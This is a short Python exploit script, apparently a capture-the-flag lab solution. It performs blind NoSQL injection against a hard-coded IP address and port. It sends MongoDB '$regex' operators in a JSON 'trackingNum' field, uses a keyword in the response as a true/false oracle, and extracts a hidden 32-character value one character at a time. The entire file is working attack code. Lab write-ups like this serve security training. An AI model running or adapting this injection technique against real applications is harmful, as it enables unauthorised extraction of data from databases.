#!/usr/bin/python3

import requests
import json

# Oracle
def oracle(t):
    r = requests.post(
        "http://94.237.63.93:35641/index.php",
        headers = {"Content-Type": "application/json"},
        data = json.dumps({"trackingNum": t})
    )
    return "bmdyy" in r.text

# Make sure the oracle is functioning correctly
assert (oracle("X") == False)
assert (oracle({"$regex": "^HTB{.*"}) == True)

# Dump the tracking number
trackingNum = "HTB{" # Tracking number is known to start with 'HTB{'
for _ in range(32): # Repeat the following 32 times
    for c in "0123456789abcdef": # Loop through characters [0-9a-f]
        if oracle({"$regex": "^" + trackingNum + c}): # Check if <trackingNum> + <char> matches with $regex
            trackingNum += c # If it does, append character to trackingNum ...
            print(f"Found correct char: {trackingNum}")
            break # ... and break out of the loop
trackingNum += "}" # Append known '}' to end of tracking number

# Make sure the tracking number is correct
assert (oracle(trackingNum) == True)

print("Tracking Number: " + trackingNum)